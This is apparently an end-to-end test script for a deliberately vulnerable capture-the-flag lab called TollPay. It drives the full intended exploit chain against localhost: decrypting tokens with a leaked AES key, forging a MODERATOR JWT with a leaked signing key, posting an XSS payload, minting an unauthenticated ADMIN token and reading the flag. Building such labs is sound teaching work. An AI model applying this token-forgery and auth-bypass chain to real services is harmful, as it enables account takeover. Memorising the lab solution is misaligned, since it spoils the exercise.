// End-to-end gate test for the TollPay path. Drives the whole intended chain
// against a running api (4001) + web (4000). Node 20 (global fetch, crypto).
const crypto = require('crypto');
const assert = require('assert');

// Single public origin: the portal (4000) reverse-proxies the API under /api.
const WEB = process.env.WEB || 'http://localhost:4000';
const API = WEB; // API reached same-origin via /api/*

// Secrets as a student would recover them from app.4f2a9c7b.js:
const AES_KEY = Buffer.from('T0llP4y_C1ient_K3y_AES256_2026!!', 'utf8');
const SIGNING_KEY = 'tollpay-signing-key-2026';

const b64url = (b) => Buffer.from(b).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
function aesDecrypt(b64) {
  const d = crypto.createDecipheriv('aes-256-ecb', AES_KEY, null);
  return Buffer.concat([d.update(Buffer.from(b64,'base64')), d.final()]).toString('utf8');
}
function jwtDecode(t) { return JSON.parse(Buffer.from(t.split('.')[1],'base64').toString('utf8')); }
function jwtSign(claims) {
  const data = b64url(JSON.stringify({alg:'HS256',typ:'JWT'})) + '.' + b64url(JSON.stringify(claims));
  return data + '.' + b64url(crypto.createHmac('sha256', SIGNING_KEY).update(data).digest());
}
const jget = async (u, opt) => { const r = await fetch(u, opt); let j; try{j=await r.json();}catch{j=null;} return {s:r.status,j}; };

let pass = 0; const ok = (m) => { console.log('  PASS', m); pass++; };

(async () => {
  // 1. Login as a customer -> AES-wrapped envelope.
  let r = await jget(`${API}/api/v1/login`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'mrodriguez',password:'Summer2026!'})});
  assert.strictEqual(r.s, 200, 'login 200');
  assert.ok(r.j.access_token, 'has access_token');
  ok('customer login returns AES-wrapped envelope');

  // 2. Decrypt with the leaked key -> raw HS256 JWT, scope EXTERNAL.
  const custJwt = aesDecrypt(r.j.access_token);
  const custClaims = jwtDecode(custJwt);
  assert.strictEqual(custClaims.scope, 'EXTERNAL', 'customer scope EXTERNAL');
  ok('AES key decrypts envelope to a valid JWT (scope EXTERNAL)');

  // 3. Fuzz: /admin with a customer token -> 401.
  r = await jget(`${API}/api/v1/admin/report`, {headers:{Authorization:'Bearer '+custJwt}});
  assert.strictEqual(r.s, 401, 'admin 401 for EXTERNAL');
  ok('admin endpoint returns 401 to EXTERNAL token');

  // 4. Re-sign a MODERATOR token with the leaked signing key -> post a task.
  const modClaims = {...custClaims, scope:'MODERATOR', type:'access_token', iat:Math.floor(Date.now()/1e3), exp:Math.floor(Date.now()/1e3)+300};
  const modJwt = jwtSign(modClaims);
  r = await jget(`${API}/api/v1/tasks`, {method:'POST',headers:{'Content-Type':'application/json',Authorization:'Bearer '+modJwt},body:JSON.stringify({title:'xss',body:'<script>1</script>'})});
  assert.strictEqual(r.s, 200, 'moderator can post task');
  ok('forged MODERATOR JWT is accepted (privilege escalation)');

  // Moderator can read the task queue; EXTERNAL cannot.
  assert.strictEqual((await jget(`${API}/api/v1/tasks`,{headers:{Authorization:'Bearer '+custJwt}})).s, 401, 'EXTERNAL cannot read tasks');
  assert.strictEqual((await jget(`${API}/api/v1/tasks`,{headers:{Authorization:'Bearer '+modJwt}})).s, 200, 'MODERATOR reads tasks');
  ok('tasks queue gated to MODERATOR+ (disclosure tier)');

  // 5. Admin victim identifiers as the XSS would scrape them from the admin /dashboard.
  //    Log into the web BFF as admin (two step: API returns the envelope, portal
  //    opens the session) and read the rendered DOM.
  const env = await (await fetch(`${API}/api/v1/login`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'toll-admin',password:'Adm1n_T0llP4y!'})})).json();
  const loginRes = await fetch(`${WEB}/portal/login`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({envelope:env.access_token})});
  const cookie = (loginRes.headers.get('set-cookie')||'').split(';')[0];
  assert.ok(cookie.startsWith('tp_session='), 'admin session cookie set');
  assert.ok(!cookie.startsWith('tp_session=eyJ'), 'session cookie is the encrypted blob, not a JWT');
  const dash = await (await fetch(`${WEB}/dashboard`, {headers:{Cookie:cookie}})).text();
  const accountId = /data-account-id="([^"]+)"/.exec(dash)[1];
  const serial = /data-serial="([^"]+)"/.exec(dash)[1];
  assert.ok(accountId && serial, 'scraped admin accountId + serial from DOM');
  ok(`admin identifiers exposed in DOM (accountId=${accountId}, serial=${serial})`);

  // 6. Unauthenticated token mint (SPTRIPS bug) using those identifiers -> plaintext admin JWT.
  //    Same-origin, no auth, no CORS needed (this is what the XSS calls).
  const mintUrl = `${API}/api/v1/customers/${accountId}/setuponlineaccesstolltag?SerialNumber=${encodeURIComponent(serial)}&ActivitySource=external`;
  const mint = await (await fetch(mintUrl)).json();
  const adminJwt = mint.access_token;
  assert.strictEqual(jwtDecode(adminJwt).scope, 'ADMIN', 'minted token is ADMIN');
  ok('unauthenticated endpoint mints a plaintext ADMIN JWT (no auth, same origin)');

  // 7. Refresh the (short-lived) admin token.
  r = await jget(`${API}/api/v1/token/refresh`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({refresh_token:mint.refresh_token})});
  assert.strictEqual(r.s, 200, 'refresh 200');
  const freshAdmin = r.j.access_token;
  assert.strictEqual(jwtDecode(freshAdmin).scope, 'ADMIN', 'refreshed token is ADMIN');
  ok('refresh_token yields a fresh ADMIN access_token');

  // 8. Admin report -> flag.
  r = await jget(`${API}/api/v1/admin/report`, {headers:{Authorization:'Bearer '+freshAdmin}});
  assert.strictEqual(r.s, 200, 'admin report 200');
  assert.strictEqual(r.j.settlementKey, crypto.createHash('md5').update('iloveyou').digest('hex'), 'flag == md5(iloveyou)');
  ok(`admin report reveals flag ${r.j.settlementKey} (md5 of a rockyou word)`);

  console.log(`\n${pass} checks passed — full chain reproducible.`);
  process.exit(0);
})().catch(e => { console.error('\nFAIL:', e.message); process.exit(1); });
